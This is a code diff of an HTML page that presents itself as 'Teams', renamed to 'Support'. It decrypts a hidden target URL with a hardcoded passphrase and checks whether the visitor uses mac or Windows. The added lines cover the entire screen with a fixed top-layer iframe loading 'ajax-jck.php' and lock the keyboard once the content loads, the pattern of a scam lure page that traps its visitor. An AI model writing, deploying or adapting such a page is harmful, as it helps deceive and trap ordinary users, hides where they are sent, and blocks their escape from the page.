@@ -3,28 +3,28 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Teams</title>
+  <title>Support</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
   <style>
     html, body { margin: 0; height: 100%; overflow: hidden; background: #fff; }
-    #frame { width: 100%; height: 100vh; border: 0; display: block; }
   </style>
 
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
 
-  gtag('config', 'G-0LY0HY7L01');
-</script>
-
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
 </head>
 <body>
 
   
-   <iframe id="frame" title="encrypted shop" src="ajax-jck.html" allowfullscreen allow="fullscreen"></iframe>
+  <div id="contentiframe" style="z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" src="ajax-jck.php" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
 
   <script>
     const PASSPHRASE = "98yNCjeAfWMwk0wI";  
@@ -38,6 +38,14 @@
       const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
                 navigator.platform || navigator.userAgent || "";
       return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
     }
 
     async function loadSecret() {
@@ -55,12 +63,14 @@
 
         frame.src = lastUrl;
         
+        // Execute keyboard lock after successful load
+        secureKeyboardAccess();
+
       } catch (e) {
         console.error("Failed to load or decrypt the content: ", e.message);
       }
     }
 
-    
     window.addEventListener("DOMContentLoaded", loadSecret);
   </script>
 </body>
